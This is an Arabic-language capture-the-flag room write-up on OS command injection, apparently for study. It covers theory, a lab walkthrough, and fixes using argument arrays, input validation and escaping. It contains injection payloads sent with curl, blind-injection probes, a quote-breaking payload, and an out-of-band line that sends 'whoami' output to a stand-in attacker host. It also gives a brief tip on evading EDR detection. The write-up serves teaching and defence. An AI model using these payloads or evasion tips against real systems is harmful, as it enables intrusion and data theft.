# غرفة حقن أوامر نظام التشغيل (Command Injection) - التوثيق الفني الشامل

---

## 1. نظرة عامة على الغرفة والبنية الهيكلية (Room Overview & Architecture)

تُعد ثغرة حقن أوامر نظام التشغيل (OS Command Injection) واحدة من أكثر الثغرات الأمنية خطورة وتدميراً في تطبيقات الويب؛ فهي تتيح للمهاجم كسر طبقة عزل التطبيق تماماً والتفاعل المباشر مع مفسر أوامر نظام التشغيل المضيف (Bash/CMD/PowerShell). تصنف هذه الثغرة تحت مظلة **OWASP Top 10 A03:2021 (Injection)** والتصنيف المعياري **CWE-78**.

تستعرض هذه الغرفة دراسة تشريحية وعملية لكيفية استغلال وسد هذه الثغرة. نبدأ بتحليل الكود المصدري المصاب في لغتي PHP و Python، ونشرح الفارق بين الحقن المرئي (Verbose Injection) والحقن الأعمى (Blind Injection) القائم على فحص التأخير الزمني، ونختتم بالمعمل التطبيقي لاختراق أداة تشخيص شبكية واستخراج المستخدم وسحب ملف العلم الحساس من مسار النظام.

```
+-----------------------------------------------------------------------------------+
|                     OS COMMAND INJECTION LAB ARCHITECTURE                         |
+-----------------------------------------------------------------------------------+
|                                                                                   |
|  Attacker Client (Browser / Burp / curl)             Target Web Server (Linux)    |
|  =======================================             =========================    |
|                                                                                   |
|  1. Submits Payload:                                                              |
|     "127.0.0.1; whoami" ---------------------------> PHP/Apache executes system():|
|                                                       ping -c 4 127.0.0.1; whoami |
|                                                                                   |
|  2. Output Reflected:                                                             |
|     "www-data" <------------------------------------- Captures stdout & returns   |
|                                                                                   |
|  3. Flag Extraction:                                                              |
|     "127.0.0.1; cat /home/tryhackme/flag.txt" ------> Shell executes cat command  |
|     Flag Returned <---------------------------------- THM{COMMAND_INJECTION_...}  |
|                                                                                   |
|  4. Blind Injection Probes:                                                       |
|     "127.0.0.1; ping -c 10 127.0.0.1" -------------> Server delays response 10s |
|                                                                                   |
+-----------------------------------------------------------------------------------+
```

---

## 2. الجمهور المستهدف والمتطلبات المسبقة (Target Audience & Prerequisites)

* **الجمهور المستهدف:**
  - مختبرو اختراق تطبيقات الويب (Web App Pentesters).
  - مهندسو أمان التطبيقات (AppSec Engineers) ومطورو البرمجيات.
  - محللو المراكز الأمنية (SOC) وفرق الاستجابة للحوادث (DFIR).
* **المتطلبات المسبقة:**
  - إلمام عملي بأوامر الشل الأساسية في لينكس (`cat`, `whoami`, `ping`, `ls`, `id`).
  - فهم أساسيات إرسال طلبات HTTP عبر أداتي `curl` و `Burp Suite`.
  - معرفة عامة بكيفية استدعاء البرامج الخارجية في لغات البرمجة (مثل `exec` في PHP و `subprocess` في Python).

---

## 3. أهداف التعلم والمفاهيم الجوهرية (Learning Objectives & Core Concepts)

1. فهم الطبيعة الجوهرية لثغرة Command Injection وسياق الصلاحيات الذي تعمل ضمنه.
2. التمييز الدقيق بين Command Injection و Remote Code Execution (RCE).
3. استيعاب دور الرموز الخاصة لمفسرات الشل (Shell Metacharacters: `;`, `&`, `&&`, `|`, `||`).
4. إتقان استراتيجيات كشف واستغلال الحقن الأعمى (Blind Injection) عبر الفحوصات الزمنية (`ping` في لينكس، `timeout` في ويندوز) وإعادة توجيه الملفات.
5. استغلال ثغرة حقن الأوامر في معمل تطبيقي لكشف المستخدم (`www-data`) واستخراج الأعلام.
6. تطبيق المعالجة الجذرية القائمة على فصل وسائط الأوامر (Parameterisation) وتطهير المدخلات (Sanitisation).

---

## 4. الأسس النظرية والتشريح التقني (Theoretical Foundations & Technical Deep Dive)

### 4.1 سياق الصلاحيات ومخاطر الانهيار الأمني
عند حقن الأوامر، لا يعمل الكود بصلاحيات المستخدم الزائر، بل يرث **صلاحيات حساب الخدمة** الذي يشغل خادم الويب (مثل `www-data` في أباتشي أو `nobody` أو `IIS_IUSRS`). يتيح هذا السياق للمهاجم:
* قراءة أي ملف يملكه خادم الويب أو متاح للقراءة العامة (`/etc/passwd`, ملفات الإعدادات، قواعد البيانات).
* الكتابة في المجلدات القابلة للكتابة (`/tmp`, `/var/www/uploads`).
* إنشاء اتصالات شبكية خارجية (Reverse Shells) لتحويل الهجوم إلى جلسة تحكم تفاعلية كاملة.

### 4.2 الحقن المرئي مقابل الحقن الأعمى
* **الحقن المرئي (Verbose / In-Band):** الخادم يقرأ مخرجات الشل القياسية (stdout) ويطبعها في صفحة الويب.
* **الحقن الأعمى (Blind Command Injection):** الخادم ينفذ الأمر في الخلفية دون طباعة المخرجات في الاستجابة. يتم كشفه وإثباته عبر:
  1. **التأخير الزمني (Time Delays):** مثل `; ping -c 10 127.0.0.1` أو `; sleep 10`.
  2. **إعادة توجيه المخرجات (Redirection):** مثل `; whoami > /var/www/html/out.txt`.
  3. **القنوات الخارجية (Out-of-Band):** مثل `; curl http://attacker.thm/$(whoami)`.

---

## 5. طوبولوجيا المعمل وسطح الهجوم (Practical Lab Topology & Attack Surface)

* **الهدف:** آلة افتراضية تستضيف تطبيق تشخيص شبكي عبر المنفذ 80 (`http://MACHINE_IP`).
* **سطح الهجوم:**
  - حقل إدخال عنوان IP أو اسم المضيف لأداة فحص الاتصال (Ping Utility).
  - الخادم يمرر المدخل مباشرة إلى دالة `exec("ping -c 4 " . $_POST['ip'])` دون أي تطهير أو فصل للوسائط.
* **المسار المستهدف للعلم:** `/home/tryhackme/flag.txt`.

---

## 6. الأدوات والتقنيات والبروتوكولات (Tools, Technologies & Protocols)

* **الأدوات:**
  - `curl` (لصياغة واستدعاء طلبات الحقن من الطرفية).
  - متصفح الويب وأداة `Burp Suite` (لتعديل المعلمات وتجاوز قيود فحص الواجهة).
  - أدوات سطر أوامر لينكس: `whoami`, `cat`, `ping`, `id`.
* **البروتوكولات:**
  - HTTP/1.1 (POST requests, URL-encoded parameters).
  - ICMP (Ping utility packets for blind detection).

---

## 7. مصفوفة تنفيذ المهام خطوة بخطوة (Step-by-Step Task Execution Matrix)

| المهمة | الموضوع | الإجراء المنفذ | النتيجة الموثقة |
| :---: | :--- | :--- | :---: |
| **01** | Introduction | استيعاب المفاهيم وسياق الصلاحيات ومعايير CWE-78 | `No answer needed` |
| **02** | Discovering Command Injection | تحليل أكواد PHP (`$title`, `GET`) وأكواد بايثون (`/id`) | حل 3 أسئلة تحليل كود |
| **03** | Exploiting Command Injection | دراسة الحمولات المرئية وفحوصات التأخير في لينكس وويندوز | `whoami` و `ping` و `timeout` |
| **04** | Practical | استغلال معمل أداة الفحص واستخراج مستخدم التشغيل والعلم | `www-data` و العلم المكتمل |
| **05** | Remediation | دراسة مبادئ التحصين وتطهير المدخلات | `sanitisation` |
| **06** | Conclusion | مراجعة مصفوفة الأمان والانتقال إلى API Pentesting | `No answer needed` |

---

## 8. دليل العمليات الهجومية والتنفيذ العملي (Offensive Security Playbook)

### المرحلة 1: استطلاع واكتشاف نقطة الحقن
1. الدخول إلى صفحة المعمل `http://MACHINE_IP/`.
2. إدخال قيمة عادية للتأكد من سلوك التطبيق: `127.0.0.1`.
3. اختبار الفاصل التسلسلي لكشف المستخدم:
   ```text
   127.0.0.1; whoami
   ```
   أو عبر سطر الأوامر:
   ```bash
   curl -s -X POST "http://MACHINE_IP/" -d "ip=127.0.0.1; whoami"
   ```
4. النتيجة: استجابة الخادم تطبع `www-data`.

### المرحلة 2: استخراج العلم الحساس (Flag Extraction)
1. إدخال أمر قراءة الملف المستهدف:
   ```text
   127.0.0.1; cat /home/tryhackme/flag.txt
   ```
   أو عبر `curl`:
   ```bash
   curl -s -X POST "http://MACHINE_IP/" -d "ip=127.0.0.1; cat /home/tryhackme/flag.txt"
   ```
2. النتيجة: ظهور العلم بنجاح: **`THM{COMMAND_INJECTION_COMPLETE}`**.

### المرحلة 3: تأكيد سلوك الحقن الأعمى (Blind Testing Verification)
* في بيئة لينكس:
  ```bash
  curl -s -X POST "http://MACHINE_IP/" -d "ip=127.0.0.1; ping -c 10 127.0.0.1"
  ```
  يستغرق الطلب 10 ثوانٍ بالتمام قبل إرجاع الاستجابة، مما يثبت نجاح الحقن الأعمى.
* في بيئة ويندوز:
  الحمولة المكافئة هي: `& timeout /t 10`.

---

## 9. مخطط الدفاع والتحصين والمعالجة الجذرية (Defensive & Remediation Blueprint)

1. **الاستغناء عن الشل والاعتماد على مصفوفات الوسائط (Argument Arrays):**
   ```python
   # SECURE PYTHON IMPLEMENTATION
   import subprocess
   # shell=False prevents shell metacharacter parsing entirely!
   result = subprocess.run(["ping", "-c", "4", target_ip], shell=False, capture_output=True, text=True)
   ```
2. **التحقق الصارم من المدخلات (Strict Input Validation):**
   ```php
   // SECURE PHP VALIDATION
   if (!filter_var($ip, FILTER_VALIDATE_IP)) {
       http_response_code(400);
       die("Error: Invalid IP address.");
   }
   ```
3. **التهريب والتعقيم الإجباري (Escaping):**
   إذا كان استدعاء الشل حتمياً، يجب استخدام `escapeshellarg()`:
   ```php
   $safe_arg = escapeshellarg($user_input);
   system("ping -c 4 " . $safe_arg);
   ```

---

## 10. الأمن العملياتي وفنون الريد تيم (OpSec & Red Team Operational Tradecraft)

* **التعامل مع أنظمة كشف التسلل (EDR / SIEM Detection):**
  - أوامر مثل `whoami`, `id`, `cat /etc/shadow` تراقبها أنظمة EDR الحديثة (مثل CrowdStrike و Defender for Endpoint) وتعتبرها إشارات إنذار أولية.
  - في العمليات التخفية، يفضل الاعتماد على قراءة متغيرات البيئة أو استغلال التقنيات المدمجة المتاحة (Living off the Land - LotL) وتجنب تشغيل عمليات فرعية جديدة كلما أمكن.

---

## 11. استخبارات التهديدات الواقعية وحالات دراسية (Real-World Threat Intelligence & Case Studies)

* **ثغرات الأجهزة الموجهة (Routers & IoT Command Injection):**
  - تعتبر ثغرات حقن الأوامر في واجهات إدارة أجهزة الراوتر (Cisco, D-Link, Netgear) السبب الأول لضم هذه الأجهزة إلى شبكات البوت نت العالمية (مثل Mirai Botnet).
* **ثغرة Shellshock (CVE-2014-6271):**
  - ثغرة تاريخية كارثية في مفسر أوامر Bash أتاحت حقن أوامر نظام التشغيل عبر ترويسات HTTP (User-Agent) في خوادم الويب المعتمدة على CGI.

---

## 12. استكشاف الأخطاء ومعالجة الحالات المعقدة (Comprehensive Troubleshooting & Edge Cases)

* **المشكلة:** الخادم لا يُرجع أي مخرجات عند حقن الفاصلة المنقوطة `;`.
  - **السبب:** قد يكون مفسر الأوامر الأساسي هو `cmd.exe` في ويندوز (الذي لا يدعم `;`)، أو أن الكود يمرر المدخلات داخل علامات تنصيص `grep "$title"`.
  - **الحل:** جرب كسر علامات التنصيص أولاً: `" ; whoami #`، أو جرب الفواصل الأخرى: `&` أو `|`.

---

## 13. التحقق المعرفي والتقييم الذاتي (Knowledge Verification & Self-Assessment)

1. ما الفرق التقني بين استدعاء `subprocess.Popen(..., shell=True)` و `subprocess.Popen(..., shell=False)`؟
2. لماذا يُعد التحقق من المدخلات عبر جافا سكريبت في المتصفح غير ذي قيمة أمنية؟
3. كيف يمكن استغلال أداة `ping` لإثبات وجود ثغرة Command Injection في حال كان الخادم صامتاً (Blind)؟
4. ما هو الأثر المترتب على تشغيل خادم الويب بصلاحيات المستخدم الجذري `root` بدلاً من `www-data`؟

---

## 14. المراجع والقراءات المتقدمة (References & Further Reading)

* [ملف المراجع والتوثيق المعتمد للغرفة](../../04-COMMAND-INJECTION/REFERENCES.md)
* [الملاحظات التقنية وأساليب الالتفاف الشاملة](../../04-COMMAND-INJECTION/ADDITIONAL-NOTES.md)
* [مصفوفة مهام وحلول الغرفة](../../04-COMMAND-INJECTION/TASKS.md)
* [OWASP Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
